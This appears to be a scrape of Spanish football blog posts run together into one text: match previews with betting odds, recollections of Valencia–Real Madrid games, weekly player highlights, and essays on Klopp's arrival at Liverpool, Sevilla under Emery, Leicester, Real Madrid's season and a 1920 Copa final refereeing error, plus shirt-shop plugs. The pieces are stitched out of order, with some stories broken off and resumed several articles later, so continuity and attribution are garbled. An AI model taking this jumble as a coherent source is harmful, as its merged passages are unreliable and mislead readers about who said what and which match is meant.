decibelios de The Kop.Luis Suárez se está adaptando con rapidez, Andy Carroll –ese chico díscolo y genial que costó cuarenta kilos- está a punto de enfundarse la zamarra roja, y Meireles, verdaderama alma de la resurrección del equipo, parece que estará disponible tras unos días entre algodones. Además, los scousers gozarán de dos motivaciones extraordinarias: la venganza por la eliminación copera, e impedir que el United les sobrepase por fin como club inglés con más entorchados ligueros. Algo que, tarde o temprano, ocurrirá, en cualquier caso.Mientras, en el otro lado, la actualidad mancunian se centra en el viejo Ferguson, y y no para bien, como suele ocurrir con el cascarrabias escocés. Sintiéndose perjudicado por el arbitraje en el encuentro del martes contra el Chelsea, el entrenador lanzó una rajada contra el trencilla Atkinson que ha levantado ampollas en Inglaterra, y el ambiente anda algo espeso. Además, con Ferdinand lesionado y Vidic sancionado, sir Alex deberá reconstruir una defensa a la que casi seguro que volverá Wes Brown, uno de esos Pavones de la vida que acabará su carrera con un currículum muy superior a su capacidad como futbolista. Al menos, los fans del United han recibido un par de buenas noticias esta semana –las renovaciones de Fletcher y el cerebro Carrick– y han celebrado el enésimo récord de Ryan Giggs. Circunstancias que hacen sonreír, pero que son irrelevantes de cara a un partido que se presenta muy incierto.El partido ofrece cuotas interesantes dado lo reñido del resultado: 2,80 victoria local (que parece al menos posible), 3,10 empate y 2,50 victoria visitante. Menos de tres goles en total, como ocurrió en el choque de Cup, se pagan a 1,65. Cuota muy interesante de 2,70 a que marca el Pichichi Berbatov, que ya hizo tres goles en la ida, y que sube a 7,00 si apostamos a que marca el primer o último gol del partido. Sin llegar a la frecuencia de los enfrentamientos del Valencia con el Barça, las visitas del Madrid a Mestalla han dejado en los últimos años unos cuantos partidazos para recordar. Así que hagamos eso precisamente, recordémoslos.Temporada 1995-96, 4-3. Llegaba el Madrid como campeón, el Valencia construía un equipazo que peleó la Liga hasta el último suspiro. Los chés aplastaron en el primer tiempo a un rival que comenzaba ya a meterse en el túnel, y en particular marcó un tal Mijatovic que unos meses después iba a provocar una fractura entre ambos clubes cuyo efecto persiste quince años después. Los merengues tiraron de orgullo en la segunda y llevaron el marcador al 3-2, pero Arroyo, clásico revulsivo, puso el último clavo en la tumba. Partido polémico e intenso, jugado bajo la lluvia, que marcó la temporada de ambos clubes.Temporada 1998-99, 6-0. Un Valencia desbocado en busca del título de Copa hizo trizas al Madrid en una noche imposible de olvidar, por cuanto que es la mayor goleada encajada por los madrileños en partido oficial en muchísimos años. Toshack sacó una defensa de broma con Dorado, Jaime, e Iván Campo, y y la expulsión de Redondo hizo el resto. Los chés ya se marcharon con 4-0 al descanso –doblete incluido de Roche- y los dos goles finales de Mendieta y el Piojo llenaron la grada de Mestalla del grito burlesco: “Sois San Marino”. Temporada 2007-08, 1-5. Esta paliza a domicilio del Real Madrid marcó el comienzo de una serie de grandes Valencia-Madrid, que esperemos prosiga esta noche. Una de las mejores versiones del equipo de Schuster, que acabaría llevándose la Liga, se llevó por delante a un Valencia convulso y decadente, inmerso en una temporada delirante que incluyó barbaridades de Koeman y también la Copa del Rey. El partido se resume en un apabullante primer tiempo de los blancos, que ya habían marcado en el primer minuto de juego y que llegaban al descanso 0-4.Su Atlético volvió a ser compacto y punzante. Una roca desde el primer punta al portero, del último bregador al primer artista como Arda Turan. Y puro veneno al contragolpe por su facilidad para interpretar espacios y tiempos. El Barcelona, en cambio, se pareció demasiado a todo lo que el Tata Martino pretende cambiar. Ignoro si al equipo le falta chispa en los músculos, seguramente a algunos de sus jugadores claves sí, y sé que ese aspecto mejorará con el rodaje que te dan dos meses de liga en los que (casi) nunca sucede nada pero durante buena parte del partido los catalanes fueron un equipo sin ideas. Tanto que pusieron en bandeja el muy manoseado y yihaidista chiste del balonmano. Trabajo abundante tiene Martino.La segunda mitad fue diferente. Principalmente porque entró Cesc para armar unas cuantas jugadas con todo el sentido del mundo, porque Alexis sigue siendo incansable tirando desmarques y porque Neymar aprovechó un despiste de Juanfran, el enésimo, para marcar de cabeza el gol que sigue dándonos argumentos a los que creemos que indudablemente tiene ángel. No deslumbró JR, eso sí. Tocó hacia atrás como ordena el libro de estilo y abandonó ese amasar la pelota tan suyo del que seguramente tirará cuando salte con el tanque de gasolina lleno pero marcó en su primer envite oficial. Hay que estar ahí. Undiano ayudó a la postal perdonándole la expulsión a Busquets con su interpretación paranormal del reglamento pero esa es otra historia.Sin querer extraer conclusiones prematuras y dando por hecho que en la liga hay más Levantes que Atléticos, al barcelonista ha de preocuparle moderadamente el estado físico de Messi, Xavi o Piqué pero mucho más si Martino conseguirá abrirle el apetito a un grupo que volvió a mostrar los mismos síntomas que intranquilizaron a la parroquia el año pasado y creímos enterrados hace unos días. Al colchonero hay que decirle poco. Felicitarle, que siga disfrutando del entierro del “pupas”. Que a su equipo le sienta de lujo el traje de Carpanta, devorando a medianoche si hace falta. Bailando con gracia en el alambre y sabiendo sufrir en el escaparate europeo, ambición y control a partes iguales, el Villarreal se clasificó para octavos de Europa League. Pese a estar construyendo la mejor campaña en Liga de su historia, el Villarreal enfrentó la trampa de esta noche ante el Nápoles cargando con un traje tejido en nervios, las dudas por los últimos y decepcionantes resultados sobrevolaban el recinto amarillo, y cerró la puerta  a la jornada luciendo sus mejores galas.Arrancó lo de El Madrigal, noche europea grande, pasaron unos cuantos minutos y los amarillos corrían por el campo tan solo a tirones. Sufriendo en los controles y en los pases, maniatado a puro pressing Borja Valero y poseídos por el ánimo gelatinoso de la previa. Pese a la injustificable ausencia del estilete original, Cavani, el Nápoles en cambio la tenía clara, correr la contra como demonios. Como el Conejo Fonseca del 92 en Valencia. Jugaban, jugaban los celestes y encontraron premio al cuarto de hora en las botas del despeinado Hamsik. Pero justo ahí, pasado el primer mareo, comenzó a crecer el Villarreal. A cara o cruz, los locales se volcaron sobre la meta de De Sanctis y apurando al límite la frenada, esa contra partenopea era veneno puro, los castellonenses voltearon el tanteador. Rossi y Nilmar mediante. Y respiraronNo obstante el Nápoles, ahí está su carrera liguera, no es de los que entregan la cuchara antes de tiempo. Mazzari, recordando que tenía a un tal Cavani en el banquillo le mandó con la caña a pescar. Casi lo logra, un prodigio el uruguayo y un pecado lo de su míster. Sombra en el desmarque y una bota de acero, Cavani (mano a mano con el Pocho Lavezzi) se encargó de volver eléctrico el tramo final. Sí, aliñaron el choque los celestes pero no lograron su cometido. Principalmente porque el Villarreal, maduro como en pocas ocasiones, supo aguantar el envite con las mismas armas que viene empuñando durante todo el curso. Añadiendo al buen pie un oficio inusitado y un espíritu inquebratable. Creciendo. Luego está, claro, lo de Borja Valero, un tipo cuya sabiduría da para cien artículos. Esperan los octavos. A continuación, voy a engarzar en un par de líneas los primeros cuatro tuits que he escrito mientras escuchaba la primera rueda de prensa de Jürgen Klopp como entrenador del Liverpool. No lo hago por esa manía tan periodística de darnos bola en nuestros propios artículos (por favor, ni un texto más sobre abuelos que os llevaban al fútbol de la manita) sino porque lo mismo que pensé yo lo habrán pensado la mayoría de aficionados del club al ver la puesta en escena del alemán. Estoy seguro. Allá va: Klopp tiene una cosa brutal. Le miras a la cara y piensas que te lo vas a pasar bien, que todo va a salir bien. Transmite. Le ves y no piensas que se equivoca fichando por el Liverpool, piensas que no puede estar en otro sitio mejor. ¿Cómo no querer a este tipo?Es fácil aparecer como el negativo del gris Brendan Rodgers. En realidad siempre ha sido tarea sencilla pero lo es mucho más en la situación actual del Liverpool y con un cromo tan carismático como Klopp en el relevo. La gente del Liverpool es el niño al que le tapas y destapas los ojos para enseñarle un careto diferente en cada ocasión. Ahora toca una sonrisa de oreja a oreja. Una contagiosa para cortar el llanto de hace cinco minutos.Ese Celta del incisivo Nolito, del hiperactivo Orellana, del incansable Larrivey y del sacrificado Krohn-Dehli me trajo agradables recuerdos de aquel Athletic del año 2012. Del equipo de las dos finales y los duelos épicos. De aquel conjunto solidario y generoso en el esfuerzo. De aquel fútbol honesto y sin dobleces que no guardaba nada y lo daba todo. Ojalá haga Berizzo dsfrutar a Vigo como lo hizo Bielsa con Bilbao. Y disfrútenlo sin miramientos. No sea que algún día despierten y el Toto ya se ha haya marchado. Marco Asensio. El partido del Espanyol en el Benito Villamarín fue, íntegramente, el partido del centrocampista balear. Los tres goles pericos nacieron de las botas del exmallorquinista, que jugó e hizo jugar a sus compañeros. El Espanyol de Sergio mira claramente hacia arriba y Marco por fin tiene aquello que tanto necesitaba: minutos de calidad en la elite.Fabián Orellana. Se está convirtiendo en agradable costumbre esto de incluir a un jugador de la vanguardia del Celta en esta sección semanal. El chileno reventó el partido del Madrigal con un golazo desde fuera del área para adelantar a los suyos. Con un dinamismo desbordante y una hiperactividad que se transforma en continuas soluciones para Berizzo, Orellana fue el jugador más importante del colíder celeste.Neymar Jr. Cuatro goles en un partido (bien, dos de ellos de penalty), en el disparatado partido ante el Rayo Vallecano aúpan al brasileño a lo más alto de la tabla de goleadores en Liga. Se reclamaba una presencia de mayor peso tras la lesión y consabida ausencia de Leo Messi. Un paso adelante. Su partido del sábado iba en esa dirección.Antoine Griezmann. Un habitual de la sección. Y no es para menos. A día de hoy, es el futbolista más incisivo del Atlético de Madrid. Con sus apariciones, los colchoneros están convirtiendo en puntos partidos de escaso juego y discutida autoridad. En su vuelta a la que fue su casa (el año pasado apenas pudo disputar seis minutos sobre el césped de Anoeta), apenas necesitó un cuarto de hora para colarse como una centella por la franja central txuriurdin, plantarse ante Rulli y batirlo por alto con clase y frialdad. Es uno de los futbolistas de este arranque de temporada.Jesé. No estaba siendo un año sencillo para el atacante canario del Real Madrid. Condenado prácticamente al ostracismo con Ancelotti tras el retorno de su grave lesión, las cosas no parecían pintar mucho mejor con Benítez en el banquillo blanco. Solo unos días atrás, Ginés Carvajal reclamaba un mayor protagonismo para su apadrinado. Más minutos. La respuesta de Benítez ante la extemporánea reclamación se la sirvió en bandeja el propio Jesé tras sus minutos contra el Levante. Los minutos y las oportunidades se ganan haciendo lo que Jesé hizo sobre el césped el sábado. Pronto ubicamos a Lucas Vázquez (Curtis, A Coruña, 1991) en ese perfil tan definido que en un pasado reciente ocuparon Pedro León o, más recientemente, Jose Callejón. Futbolista nacional, joven, de perfil modesto, con una notable hoja de servicios en equipo de media tabla… y llamado a ocupar un papel absolutamente secundario, pero necesario y socorrido, en una megaplantilla plagada de estrellas. Pero había un detalle especial en su incorporación.Lo malo con Rodgers/precioso de la aparición de Klopp era que el sufrimiento ya duraba demasiado/que las cosas pueden cambiar a mejor a partir de ahora. Tras dos temporadas a la deriva, no solo en el juego sino en la identidad, Anfield verá un equipo con las ideas claras y entrenador a la altura de la marca que representa. Incluso en las derrotas, que llegarán. Algo que se echaba de menos con Rodgers al mando.Como en Diarios de Fútbol no tenemos expertos en lenguaje corporal ni un analista dedicado 24/7 a desmenuzar el Liverpool (debería ser Juan Morán, ahí lo dejo) no hay mucho más que podamos aportar por el momento salvo que ahora apetece ver al Liverpool. Apetece todavía un poquitín más ver la Premier.Foto: LFCLiverpool, Liverpool, mucho Liverpool en Classic Football Shirts. Una gama completísima de artículos y productos de los de Anfield en nuestra tienda de camisetas de cabecera. Athletic y Barcelona están invitados (San Mamés, 22:00) a bailar una vez más en el alambre copero, 0-0 en la mochila obliga, en uno de esos partidos diseñados para estimular la imaginación incluso del más necio de los espectadores. Ya saben, muchedumbre catedralicia alterando la pizarra, Reyes de Copas, la finura contra el músculo… Y el caso es que aprovechando el navegar matutino, café en mano, me he encontrado con alguna curiosidad sobre el duelo. Como que la primera final del torneo entre el FC Barcelona y el Athletic Club, 1920, pasó a la historia no tanto por las evoluciones de un gran plantel blaugrana, con Zamora y Samitier impartiendo escuela, como por el clamoroso error de Beltrán de Lis, trencilla designado para aplicar la norma en aquella jornada grande de fútbol primigenio en El Molinón.La mayoría, especialmente los que se desvivan por alguno de los dos equipos hoy en liza, conocerán el incidente. El resto, lean como se narra la legendaria torpeza desde uno y otro lado. De primeras Jon Agiriano, periodista de El Correo en su libro “Una cuestión de orgullo. Las 24 Copas del Athletic Club”. “En la primera parte, con empate a cero en el marcador, el Athletic se cobró un penalti en el área de ‘El Divino’. Laca lo ejecutó con serenidad. Gol. Beltrán de Lis, sin embargo, anuló el tanto porque, al parecer, un jugador rojiblanco entró en el área antes de tiempo.Algo que, en su modestia, hacía presagiar un cierto trato de favor, una ligera condescendencia si las cosas no salían como debían salir desde el primer momento. El pasado madridista de Lucas supone, como lo supuso en su día el de Callejón, un valor añadido a la hora de sustentar la confianza en él. Tres campañas enrolado en el Castilla se antojan como un salvavidas oportuno del que echar mano si las cosas no terminan de salir del todo bien. Es de la casa y, en consecuencia, hay que tratarlo con mimo y paciencia paternal hasta que termine de salir del cascarón y ganarse una cierta continuidad en las alineaciones. Porque su éxito supone el éxito de un modelo de club que el aficionado madridista ansía ver relucir.El protagonismo de Lucas Vázquez está siendo mayor del esperado en este primer tercio de la temporada. Interpretando su papel con decisión, el gallego, pura verticalidad, no esconde nada cada vez que tiene oportunidad de pisar el césped. Lo pone todo en juego porque no tiene casi nada que perder y sí mucho que ganar, al contrario que algún compañero con superior estatus y bastantes más horas de vuelo. Se atreve a hacer cosas porque de su capacidad para hacer cosas depende la viabilidad de su trayectoria como futbolista del Real Madrid. Llega con un buen repertorio de cosas por demostrar y por eso arriesga. Encara, ofrece, intenta el regate, busca la profundidad y su participación nunca queda plana ni intrascendente. Por eso ha contado con muchos más minutos, y minutos de calidad, de los que cabía esperarse inicialmente. Ha sido esa osadía la que le ha empujado a entrar derribando la puerta en lugar de llamando a la misma con timidez.El volante gallego ha sido titular en dos partidos de Liga (especialmente brillante en el de Balaídos) y uno de Liga de Campeones (el decisivo duelo del Parque de los Príncipes). Además, no se pierde una convocatoria de Benítez desde el pasado día 15 de septiembre. Su incidencia en los planes del técnico le ha presentado como una más que competente alternativa durante el pasado mes de octubre. Una solución oportunísima para las delicadas ausencias de Gareth Bale o James. ‘Si Lucas juega antes que otros es simplemente porque se lo ha ganado‘. Y no hace falta ahondar en explicaciones mucho más de lo que ya lo hizo el propio Benítez. Aquel gran Sevilla que, dirigido desde el banquillo por Juande Ramos y ensamblado en torno a figuras como Kanouté, Luis Fabiano, Navas, Dani Alves o Palop, conquistó dos copas de la UEFA consecutivas, una copa del Rey, una Supercopa española y otra Supercopa europea entre los años 2006 y 2007 estableció una referencia histórica para todo el sevillismo. El paso de los años, la irremediable salida de sus principales figuras y la lógica dificultad para volver a engarzar el entramado de un nuevo proyecto sólido engrandecieron aún más los logros de aquel bienio mágico que llevó a mitificar a aquel formidable grupo. Era complicado que la historia volviese a ser tan generosa con el club nervionense.Manolo Jiménez, Antonio Álvarez, Goyo Manzano, Marcelino y Míchel fueron desfilando por el banquillo del Sánchez Pizjuán mientras el Sevilla reaprendía a vivir con escasa ropa y pocos lujos. Ninguno de sus respectivos proyectos cuajó. Probablemente, mucho tuvo que ver en el devenir de aquellos años la imperiosa necesidad de vender y el escaso tino de una secretaría técnica que, de pronto, parecía haber perdido las buenas artes de los tiempos en los que era referencia en todo el continente. Los Guarente, Dabo, Stankevicius, Manu del Moral, Maduro o Babá no solo no dieron el resultado esperado, sino que prácticamente hicieron perder toda esperanza de reverdecer laureles y volver a marcar una época cuando aún no había transcurrido un lustro desde el último gran éxito. El ambiente en el sevillismo incluso se enrareció. El graderío del Pizjuán comenzaba a aparecer inusualmente vacío y la marcha de la entidad parecía incluso salpicada por los efectos colaterales del llamado ‘Caso Minutas’, que acabó dando con José María del Nido, gurú y faro espiritual del gran Sevilla de la pasada década, entre rejas y fuera de la poltrona sevillista.El adiós de ‘Don José María‘ coincidió con la llegada de Unai Emery al banquillo del Pizjuán para cubrir el hueco dejado por Míchel. Tras un comienzo titubeante, en el que le costó digerir la pesada carga de la herencia dejada por su antecesor en el cargo y finalizar su primera media campaña con dignidad, la pasada, su segunda, fue la de su confirmación. Porque Unai Emery es un gran entrenador. Un técnico que comete muchos más aciertos que errores en sus planteamientos y que además maneja una gran cintura a la hora de solucionar sus equivocaciones sobre la marcha, como dejó de manifiesto en la segunda mitad del partido de ida de los cuartos de final ante el Zenit.El técnico de Fuenterrabía ha colocado al Sevilla en trámite de volver a marcar una época. En el horizonte inmediato, amén de una más que viable clasificación para la Champions League, aparece la final de la Europa League de Varsovia. La segunda consecutiva, tras el título del año pasado ante el Benfica. La posibilidad de convertirse en el sorprendente rey, con su cuarto título, de una competición a la que parece unirle un idilio irracional. Por encima de mágicos ilustres como el Inter, el Liverpool o la Juventus. Unai ya no es ese técnico perdedor. Ya no es el estratega que salió estigmatizado de Mestalla. Está en disposición de ganar, de marcar una nueva época para el sevillismo. Al final, no era tan complicado que la historia volviese a ser generosa con la entidad nervionense. Wes Morgan, internacional jamaicano y capitán del Leicester City desde hace un par de temporadas, se ha pasado media vida siendo un genuino don nadie. Uno de tantos futbolistas a los que casi nadie consigue poner cara que deambulan por el fútbol inglés. Lo que Morgan ha estado haciendo durante media vida no ha sido jugar al fútbol cada fin de semana, sino trabajar y ganarse el jornal vestido de corto con la abnegación de quien acude cada mañana al alba a su puesto de trabajo de reponedor en el Tesco o de soldador en una cadena de montaje. Un soldado raso que el domingo consiguió que su cabeza emergiera para dar una nueva victoria a su equipo. Uno a cero ante el Southampton. Uno a cero, uno a cero y uno a cero. Economía del esfuerzo. El fútbol liofilizado y en ración de combate. El sello Ranieri. Puro Leicester.Wes Morgan es la personificación de este sorprendente Leicester City. Es el tío que viene de abajo y que tiene la fortuna de aparecer en el sitio justo en el momento preciso. El invitado discreto con el que nadie cuenta pero que acaba convirtiéndose en el más simpático y exitoso de la fiesta. Es como Jamie Vardy, como N’Golo Kanté, como Riyad Mahrez, como Danny Drinkwater. Cada uno con sus peculiaridades y sus aptitudes, pero todos con un mismo genoma. Gente que lleva toda la vida saltando al césped con el buzo de John Deere lleno de mierda y los guantes de trabajo. Precisamente ese tipo de futbolista que en manos de un técnico como Claudio Ranieri, esa extraña anomalía espacio-tiempo que gobierna el proyecto a orillas del Soar, adquiere una dimensión extraordinaria.No soy un ferviente seguidor del Leicester. No soy de esos que salta con sus escuetas victorias y los vitorea en Twitter. No voy a mentirme a mí mismo y descubrirme ahora ante la audiencia como un apasionado seguidor de los Foxes, porque sería estúpido. Pero su irresistible historia es la nuestra. Su más que previsible éxito es la anécdota feliz y el éxito de todos nosotros. De todos los que somos seguidores de uno de esos equipos no habituados a las mieles del triunfo y que resistimos con estoicismo y abnegación frente a un sistema que da más a quien más tiene y un nuevo orden futbolístico que premia e incentiva al gigante y aplasta y menosprecia al que no llega. Como dijo mi compañero Ramón Flores semanas atrás, ‘necesitamos que Perseo tumbe a la Medusa, que los espartanos aguanten a los persas, que Labordeta conserve su escaño.Que va madurando lentamente, olvidando el pasado y agarrándose al futuro para encontrar en él ese toque de felicidad que pueda anestesiar la grada. El talento recubierto de oficio, como cuando pasó Mourinho por allí, como cuando consiguió domar el espectáculo para conseguir los títulos desde el sacrificio. Y que sencillo es ver a Miguel Gutiérrez vestido con la camiseta del Nottingham Forest, un equipo pequeño que logró enamorar a media Europa. Que se olvidó pronto de donde venía para dejar bien claro a donde quería ir. Y hacerlo desde la humildad y sencillez y no desde el estruendo y el autobombo al que acostumbran los entrenadores o los presidentes en las ruedas de prensa. Ir paso a paso sin dejar víctimas en el camino, todo lo contrario, arrastrando consigo a cuantos parroquianos descreídos se encontraba. Referencia de una generación de equipos sencillos que algún día harán historia. O la locura contenida del Olympique de Marsella vestida por Ramón J. Flores. La aparente mesura frente al descontrol, el ingenio a ramalazos, el método mezclado nervio. El pase preciso en el momento preciso, la ruptura inesperada. O Dadan Narval vistiendo con la camiseta de Ghana. Haciéndose un hueco entre los grandes con más corazón que orden, con más entusiasmo que sistema. Con más talento que el del músculo, con más sufrimiento que el rival, con más fuerza que táctica sibilina. De frente, al todo o nada de un partido que siempre es el último. Al límite del esfuerzo. Y como olvidar a Sergio Cortina llevando su camiseta del West Ham. El amor antibalas, lo macarra y lo elegante en un mismo tejido. Barriobajero pero distinguido. Con más nervio en sus piernas que copas en sus vitrinas. Sin necesidad de ganar para ser un equipo ganador. Underground, apestando a pescado frito, desenvuelto en las calles que dan vida a las ciudades, esas que no siempre están transitadas, esas que a veces parpadean en mitad de la noche, donde se forjan las historias verdaderas.Los imagino a todos estos en el tercer tiempo, con las camisetas sudadas tras una pachanga con más voces que fútbol. Siempre hemos hablado de esto, la medida de un hombre se da en el campo de fútbol. Somos como jugamos. El cobarde sobre el césped será un cobarde en su despacho. Quien no mete la pierna no vale cuando la pandilla se junta rodeando las jarras de cerveza. Imagino ese partido, imagino esas camisetas, me permito la licencia de hablar bien de mis compañeros en este blog. Vosotros, que también sabéis lo que es tener las piernas amoratadas en torno a una mesa de bar tras un demencial partido de domingo, brindando, exaltando la amistad sellada en torno al balón, sabréis entenderme.Puedes comprar estas camisetas y cientos más en Classic Football Shirts. El dinero no da la felicidad, ni la apologética llegada de Florentino curó los males de un equipo ensombrecido por su antagonista blaugrana. Ni los grandes jugadores ni los entrenadores metódicos pueden garantizar el éxito deportivo. El Real Madrid naufragó este año, de nuevo, en la Liga. Un sumatorio de puntos abultadísimo no fue suficiente para adelantar al Barcelona.Perder los duelos directos contra un rival incombustible es un pecado imperdonable para un equipo que quiere alzarse con el campeonato. Aquel 0-2 en un Bernabéu de gala fue suficiente para despertar a los jugadores blancos del sueño. El arreón final no sirvió para nada. Por más calculadoras que esgrimiéramos, la Liga se perdió en la jornada 31. Pedro y Messi sepultaron un proyecto hecho para la victoria. La Liga era la pomada tras la caricaturesca derrota frente al Alcorcón en Copa y la eliminación inesperada frente al Lyon en casa. El futuro pasa por Mourinho. En él se quiere encontrar la competitividad en los grandes partidos. Ese fue uno de los problemas de Pellegrini, que en los encuentros trascendentales no logró estar a la altura. La sensación, una vez concluida la Liga, es que a la plantilla le faltaron remaches. La delantera se encomendó a Higuaín y Cristiano, pero no encontró apoyo en Benzema o Raúl. El centro del campo se cimentó en Xabi Alonso o Van der Vaart, pero hizo aguas con Lass o Gago. La defensa, tal vez su mejor línea con Albiol, Ramos, Arbeloa, Garay y Pepe –hasta su lesión- no tuvo a un lateral izquierdo de garantías. Marcelo siempre rindió mejor como interior. Es la historia de siempre. ¿Hasta qué punto fichar estrellas descompensa el bloque? ¿Por qué fichar “galácticos” a precios millonarios en vez de intentar conseguir una plantilla equilibrada? ¿Es culpa del entrenador o de los futbolistas? En fin, cuestiones con menos respuestas que el último capítulo de Lost.El Real Madrid parece abonado a la épica. Remontar, marcar al final, encuentros de refriega, de sobresaltos, sobreponerse a la adversidad a través de carácter y entrega… lo que definió al equipo en su periplo reciente con Capello, Schuster o hasta con Juande Ramos. Un fútbol que huye del control y la técnica y que convierte cada duelo en un combate a KO directo. Recibir y dar. Aguantar los golpes en contra e intentar devolverlos más fuerte. Nada que ver con el fútbol académico del Barcelona, nada que ver con la solidez defensiva del Inter de su futuro entrenador. Aquí se juega a otra cosa, y es una opción divertida. Práctica no ha sido, porque no ha llevado a ninguna parte, pero la emoción, el griterío y la esperanza siempre han acompañado a este conjunto de Pellegrini. Se censura al chileno y se le hace responsable de una mala temporada en el juego. Me hace gracia que la solución al pobre juego blanco sea un técnico como el portugués, que no se caracteriza por el espectáculo, no es un Circo del Sol futbolístico sino una apuesta por la contención, por el primitivismo más descarado, por el blindaje a su portero y la galopada al contraataque. Un fútbol que tiene sus seguidores pero que a los más puristas parece escandalizar. Resumiendo, que hemos dado muchas vueltas para volver a Capello. Digamos que es curar un corte en el pulgar con la amputación del brazo. No hay coherencia en las críticas al entrenador actual, o su relevo, y la manera de redimirlas sea ahondando en el problema. En mi opinión, modestísima, el proyecto madridista debe hacerse a largo plazo, con este entrenador u otro, pero con espacio para respirar sin la angustiosa presión de un entorno voraz. Conjugar a tanto jugador desequilibrante no debe ser un proceso sencillo. Los lógicos problemas de adaptación al sistema se ven magnificados, además, por una prensa guillotinesca. Kaká no ha existido, ni Benzemá, ni el centro del campo ha ayudado a dar armonía a todo el bloque. El equipo jugaba, por momentos, partido, descuartizado, como por entregas. A veces brillaban los de atrás y otras veces brillaban los de delante. Pero no había sintonía entre las partes, ni solidaridad entre líneas, ni demasiado esfuerzo por que eso fuera así. Fe en los delanteros, tal vez. Tener a Cristiano Ronaldo en el equipo es una tranquilidad para cualquier equipo. Sabes que de dos que tenga, una la enchufa. Es un verdadero creador de peligro. El equipo ha trabajado tanto para él que no existía una mirada horizontal del campo, todo era ir arriba sin la necesaria contemporización del juego, sin esas pausas dramáticas que hacen ganar los partidos.Este verano toca finalizar la purga del año pasado. Sobra Drenthe, sobran Diarras, sobra Dudek, sobra Guti y sobra, con todo el dolor de mi corazón, Raúl. El equipo se está rejuveneciendo, retomando un camino menos megalomaniaco y más pedestre. El fichaje de Mou es una incógnita. Podemos decir, con criterios empresariales, que Pellegrini no ha funcionado. Que no ha cumplido los objetivos –sí, en el fútbol los objetivos se llaman títulos-, y sumar puntos para no ganar nada tiene tanto valor como conseguir billetes y después quemarlos en la chimenea. Vivimos un Madrid de transición, ni Florentino es el enemigo ni todo es achacable al desembolso económico. Hasta donde yo sé, tener a los mejores del mundo en tu plantilla no debe ser un problema, todo lo contrario. Esta temporada ha desempolvado aquel miedo a ser un dispensador de dinero sin futuro.Una temporada demasiada gris para las expectativas. Pero ya decíamos hace un tiempo que no se pueden celebrar los fichajes como si equivalieran a campeonatos. Por más que brille un jugador no resplandece más que un trofeo en la vitrina del club. Es difícil crecer con un rival tan en forma, tan ganador. El análisis de la Liga no debe hacerse extensivo al estado de salud del club. Los títulos llegarán, pero a través del equipo, a través del bloque y no de cada una de las piezas por separado. Mourinho representa esa filosofía.Hasta ahí, nada extraño. Lo extraordinario fue que el colegiado, en lugar de mandar repetir el penalti, ¡pitó falta contra el Athletic! La pifia fue de tal calibre que llegó a examinarse como un disparate digno de estudio en el Comité de Árbitros de Inglaterra”. Y ahora perdónenme el salto temporal pero observen como aquel cimiento de lo que hoy es un enfrentamiento clásico se vivió de manera diferente a orillas del Mediterráneo. Lean al periodista Alberto Martín Fernández, bajo el apropiado seudónimo de Juan Deportista, un 6 de mayo de 1920, cuatro días después de la final que coronó por cuarta vez al conjunto culé, en El Mundo Deportivo. “Coma incurre en penalti, momentos después comenzado el juego. Ante la enorme expectación de todo el público tíralo Laca entrando en la red, pero el árbitro lo anula por adelantarse el jugador bilbaino Echevarría (…) El arbitraje de Beltrán de Lis ha sido imparcialísimo, habiéndose aplaudido su actuación. Vencedores y vencidos han sido obsequiados con un banquete por la Federación Asturiana”. Y Juan Deportista abandonó la escena del crimen silbando despreocupadamente…Beltrán de Lis, que compaginaba sus labores en el césped con la dirección del comité arbitral de la época, abandonó voluntariamente la carrera arbitral tras reconocer su error actuando en virtud del honor que se le suponía al torneo. Anécdotas de Copa. Y que todavía abunden los que se empeñan en devaluarla edición tras edición… El Manchester City del rudimento se coló en la final de FA Cup y el Real Madrid empató el primer clásico a puro pulmón. Sí, ayer fue un mal día para los extasiados del fútbol champán, que en España son legión de un tiempo a esta parte. Cómo estará el tema que antes de que terminaran sendas funciones, con el pastel todavía tierno y en el horno, no faltó quien se apresurara a afear los logros futuros de este par de escuadras indignas. Ya les digo, siquiera antes de que se produjeran. Vaya a ser que al buen nombre del fútbol le cayera un gramo de hollín.Esto es así y se lo digo yo que me tiré desde las seis empeñado con el asunto de la pelotita, colgado de lives y cotejando la conversación en las redes sociales. Que si la temporada del celeste será decepcionante aunque lo único tangible es que el susodicho club tiene a mano agarrar su primer título en 35 años. Y todo pese a las maquinaciones de un italiano, al parecer empecinado en derruir su propia casa. ¿Y qué me dicen de esas estrellas del Madrid a las que les ha dado por correr y meter el pie? No les digo nada su entrenador, un tipo funesto que tiene por costumbre ordenar un pase mejor que dos ¡Habráse visto!Y claro, los hostiazos a la piñata hacen tanto ruido que no se escucha al tipo del fondo. Al que te está contando, con acento templado, que el juego del Manchester United este año no da realmente para tanto éxito. O que el Barcelona del concepto apenas inquietó la meta de Casillas pese a una estadística de posesión de balón casi obscena. Que Mancini, el sacrílego amarrete, puede ser el primer técnico en abrir la vitrina del City tras casi cuatro décadas de miseria. Y no hablo de resultadismo. Hablo de reivindicar que no existe una único camino noble al laurel, de que los blancos y negros no existen. Del Barcelona y el Arsenal, de la selección española pero también de la italiana y del Wimbledon. De que, en definitiva y ya es hora de que los talibanes entren en razón, el fútbol es rico cuando es variado. Venkman, Stantz, Spengler y Susaeta. El rubio es el cuarto cazafantasmas con el que puedes contar cuando los espíritus de la derrota toman el barrio. En Oviedo las maldiciones siempre vienen en tamaño ‘king size’ por eso es fundamental tener a un tipo seguro a tu lado. En Elche tocó, creó y desbordó en un centro del campo al que le viene faltando juego. El gol del empate fue solo un ejemplo más de su capacidad para aportar soluciones en cualquier parte del campo. En Cádiz apareció en una esquina, muchas veces le vemos en la cobertura al jugador desprotegido y ayer en un desmarque de killer al primer palo aprovechando un buen centro y el arrastre de Cervero.Muy destacable el golazo de Sergio Ramos, llamativo en un lateral.Temporada 2008-09, 3-0. El Madrid que acudió a Mestalla en el verano del 2009 era un grupo destruido, machacado por meses de persecución, y abandonada la épica del resistente tras el 2-6 del Barça en el Bernabéu. El mítico trío de avispas Mata-Silva-Villa aprovechó la coyuntura que se le servía en bandeja, y acabó abusando con un juego preciso y alegre, incontestable para los de negro. El fantasma de la humillación sobrevoló durante muchos minutos el coliseo valencianista, inexistente el Madrid después de que sus dos ocasiones iniciales se fueran al limbo. Maravilloso el tanto de Baraja, canto del cisne.Temporada 2009-10, 2-3. La última gran batalla igualada que han dirimido estos dos colosos llegó hace dos años casi justos. Una maravilla de intensidad que le costó los ligamentos a Pepe, que mostró el caràcter del equipo valenciano, capaz de empatar dos veces, y que sirve como prueba de que Higuaín y Benzema pueden rendir juntos. También uno de los peores partidos que se le recuerdan a Iker Casillas, muy blando tanto para cerrar a Villa como en el tiro de 